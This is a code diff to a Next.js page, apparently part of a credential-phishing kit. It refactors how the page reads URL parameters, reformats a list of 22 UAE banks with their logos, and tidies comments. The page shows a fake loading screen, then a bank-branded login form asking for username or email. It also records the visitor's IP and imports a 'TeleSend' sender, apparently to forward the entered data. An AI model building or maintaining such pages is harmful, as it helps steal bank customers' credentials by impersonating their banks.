@@ -1,21 +1,22 @@
+// app/payment/banks/bankaz/page.jsx
 'use client'
 
-import { useRouter, useSearchParams } from 'next/navigation';
+import { useRouter } from 'next/navigation';
 import Image from "next/image";
 import { useState, useEffect } from 'react';
 import TeleSned from "../../../../server/TeleSend";
 
-export default function Page() {
+// استقبل searchParams كـ prop بدلاً من استخدام useSearchParams()
+export default function Page({ searchParams }) {
     const router = useRouter();
-    const searchParams = useSearchParams();
     const { Send } = TeleSned();
     const [isLoading, setIsLoading] = useState(false);
     const [showSplash, setShowSplash] = useState(true);
     
-    // الحصول على البارامترات من URL
-    const bankId = searchParams.get('bankId');
-    const bankName = searchParams.get('bankName');
-    const ip = searchParams.get('ip');
+    // الحصول على البارامترات من searchParams prop
+    const bankId = searchParams?.bankId || null;
+    const bankName = searchParams?.bankName || null;
+    const ip = searchParams?.ip || null;
 
     // إخفاء شاشة التحميل بعد 5 ثوانٍ
     useEffect(() => {
@@ -26,31 +27,30 @@ export default function Page() {
         return () => clearTimeout(timer);
     }, []);
 
-      const banks = [
-    { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif',url:'/payment/banks/bankaz' },
-    { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg',url:'/payment/banks/bankaz'},
-    { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png',url:'/payment/banks/bankaz' },
-    { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg',url:'/payment/banks/bankaz' },
-    { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg',url:'/payment/banks/bankaz' },
-    { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg',url:'/payment/banks/bankaz' },
-    { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png',url:'/payment/banks/bankaz'  },
-    { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg',url:'/payment/banks/bankaz'  },
-    { id: 9, name: 'HSBC بنك', src: '/bhsbc.png',url:'/payment/banks/bankaz'  },
-    { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif',url:'/payment/banks/bankaz' },
-    { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif',url:'/payment/banks/bankaz' },
-    { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg',url:'/payment/banks/bankaz' },
-    { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg',url:'/payment/banks/bankaz' },
-    { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg',url:'/payment/banks/bankaz' },
-    { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg',url:'/payment/banks/bankaz' },
-    { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg',url:'/payment/banks/bankaz' },
-    { id: 17, name: 'Wio Bank', src: '/wiob.webp',url:'/payment/bankaz' },
-    { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg',url:'/payment/banks/bankaz' },
-    { id: 19, name: 'بنك عجمان', src: '/bajman.jpg',url:'/payment/bankaz' },
-    { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg',url:'/payment/banks/bankaz' },
-    { id: 21, name: 'Liv X', src: '/livexb.jfif',url:'/payment/banks/bankaz' },
-    { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg',url:'/payment/banks/bankaz' }
-
-  ];
+    const banks = [
+        { id: 1, name: 'بنك أبو ظبي التجاري', src: '/b-abodabetgare.jfif', url: '/payment/banks/bankaz' },
+        { id: 2, name: 'بنك أبو ظبي الأول', src: '/b-abodabeone.jpg', url: '/payment/banks/bankaz' },
+        { id: 3, name: 'بنك الإمارات الإسلامي', src: '/b-emaratislam.png', url: '/payment/banks/bankaz' },
+        { id: 4, name: 'بنك الإمارات دبي الوطني', src: '/b-emaratdubaiwatne.jpg', url: '/payment/banks/bankaz' },
+        { id: 5, name: 'بنك دبي التجاري', src: '/b-dubaitgare.jpg', url: '/payment/banks/bankaz' },
+        { id: 6, name: 'بنك أبو ظبي الإسلامي', src: '/b-abodabeislam.jpg', url: '/payment/banks/bankaz' },
+        { id: 7, name: 'بنك المشرق', src: '/b-mahrok.png', url: '/payment/banks/bankaz' },
+        { id: 8, name: 'بنك دبي الإسلامي', src: '/b-dubaiislam.jpg', url: '/payment/banks/bankaz' },
+        { id: 9, name: 'HSBC بنك', src: '/bhsbc.png', url: '/payment/banks/bankaz' },
+        { id: 10, name: 'مصرف الشارقة الإسلامي', src: '/msrfsharka.jfif', url: '/payment/banks/bankaz' },
+        { id: 11, name: 'بنك رأس الخيمة الوطني', src: '/b-raskema.gif', url: '/payment/banks/bankaz' },
+        { id: 12, name: 'بنك الفجيرة الوطني', src: '/b-fgerwatny.jpg', url: '/payment/banks/bankaz' },
+        { id: 13, name: 'بنك الاستثمار', src: '/bank-investment.jpg', url: '/payment/banks/bankaz' },
+        { id: 14, name: 'بنك أم القيوين الوطني', src: '/b.jpg', url: '/payment/banks/bankaz' },
+        { id: 15, name: 'بنك الماريا المحلي', src: '/bmarea.jpg', url: '/payment/banks/bankaz' },
+        { id: 16, name: 'بنك الهلال', src: '/bank-hilal.jpg', url: '/payment/banks/bankaz' },
+        { id: 17, name: 'Wio Bank', src: '/wiob.webp', url: '/payment/bankaz' },
+        { id: 18, name: 'المصرف', src: '/bank-al-masraf.jpg', url: '/payment/banks/bankaz' },
+        { id: 19, name: 'بنك عجمان', src: '/bajman.jpg', url: '/payment/bankaz' },
+        { id: 20, name: 'بنك الشارقة', src: '/bank-sharjah.jpg', url: '/payment/banks/bankaz' },
+        { id: 21, name: 'Liv X', src: '/livexb.jfif', url: '/payment/banks/bankaz' },
+        { id: 22, name: 'Zand Bank', src: '/bank-zand.jpg', url: '/payment/banks/bankaz' }
+    ];
 
     // العثور على البنك المحدد
     const selectedBank = banks.find(bank => bank.id === parseInt(bankId));
@@ -91,8 +91,6 @@ export default function Page() {
             <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
                 <div className="z-10 w-full max-w-md mx-auto">
                     <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-12 md:p-16 border border-gray-100">
-                        
-                        {/* الشعار */}
                         <div className="mb-8">
                             <Image
                                 src={selectedBank?.src || '/bank-placeholder.png'}
@@ -102,18 +100,13 @@ export default function Page() {
                                 className="object-contain rounded-full shadow-lg"
                             />
                         </div>
-                        
-                        {/* النص الثابت */}
                         <h1 className="text-2xl md:text-3xl font-bold text-[#008000] mb-8 text-center">
                             {selectedBank?.name || 'جاري التحميل'}
                         </h1>
-                        
-                        {/* الدائرة المتحركة */}
                         <div className="relative w-24 h-24">
                             <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
                             <div className="absolute inset-0 rounded-full border-4 border-[#008000] border-t-transparent animate-spin"></div>
                         </div>
-                        
                         <p className="mt-8 text-sm text-gray-500">
                             يرجى الانتظار جاري تجهيز البيانات...
                         </p>
@@ -145,7 +138,6 @@ export default function Page() {
     return (
         <main className="flex min-h-screen flex-col items-center justify-center p-4 md:p-8 bg-gradient-to-br from-gray-50 to-gray-100">
             <div className="z-10 w-full max-w-md mx-auto">
-                {/* البطاقة العلوية */}
                 <div className="flex flex-col items-center justify-center w-full rounded-xl shadow-xl bg-white/95 backdrop-blur-sm p-6 md:p-8 border border-gray-100 mb-6">
                     <div className="w-20 h-20 relative rounded-full overflow-hidden bg-gray-50 flex items-center justify-center mb-4">
                         <Image
@@ -167,7 +159,6 @@ export default function Page() {
                     </p>
                 </div>
 
-                {/* نموذج تسجيل الدخول */}
                 <div className="bg-white rounded-xl shadow-xl p-6 md:p-8 border border-gray-100">
                     <h1 className='text-[#008000] text-lg font-bold text-center mb-4'>
                         {selectedBank.name} - تسجيل الدخول
@@ -175,7 +166,7 @@ export default function Page() {
                     <form onSubmit={handleSubmit} className="space-y-5">
                         <div>
                             <label htmlFor="username" className="block mb-1.5 text-sm font-semibold text-gray-700">
-                               او البريد الكتروني اسم المستخدم <span className="text-[#008000]">*</span>
+                                اسم المستخدم أو البريد الإلكتروني <span className="text-[#008000]">*</span>
                             </label>
                             <input
                                 type="text"
